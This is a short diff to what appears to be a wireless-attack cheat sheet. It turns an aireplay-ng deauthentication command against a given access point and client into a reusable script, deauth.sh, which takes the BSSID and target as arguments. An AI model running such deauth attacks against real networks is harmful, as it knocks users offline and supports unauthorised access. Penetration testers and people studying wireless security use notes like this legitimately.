@@ -44,7 +44,11 @@ airodump-ng --manufacturer --beacons --showack --wps --uptime \
 ```bash
 iwconfig wlan1 channel 4
 
-aireplay-ng -0 99 -D -a BSSID -c TARGET wlan1
+cat >> deauth.sh << "EndOfMessage"
+aireplay-ng -0 99 -D -a $1 -c $2 wlan1
+EndOfMessage
+
+chmod +x deauth.sh
 ```
 
 ## Kill View
